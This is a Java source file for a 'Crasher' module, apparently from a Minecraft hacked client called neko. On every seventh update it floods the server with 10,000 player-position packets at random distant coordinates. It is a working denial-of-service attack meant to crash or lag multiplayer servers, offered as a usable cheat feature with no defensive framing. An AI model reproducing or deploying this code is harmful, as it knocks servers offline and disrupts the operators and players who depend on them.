package neko.module.modules.misc;

import neko.module.Category;
import neko.module.Module;
import neko.utils.Utils;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0APacketAnimation;
import net.minecraft.util.BlockPos;

public class Crasher extends Module {
	
	int loop = 0;
	public static boolean active;
	
	public Crasher() {
		super("Crasher", -1, Category.MISC, false);
	}
	
	public void onEnabled() {		
		super.onEnabled();
	}
	
	public void onDisabled() {
		super.onDisabled();
	}	

	public void setValues() {
		this.values = "";
	}
	
	public void onUpdate() {
		++this.loop;
		if (this.loop > 6) {
			int spam = 0;
			while (spam < 10000) {
				mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*30000+5000), (Math.random()*100+10), (Math.random()*30000+5000), true));
				++spam;
				this.loop = 0;
			}
			super.onUpdate();
		}
	}
	
}
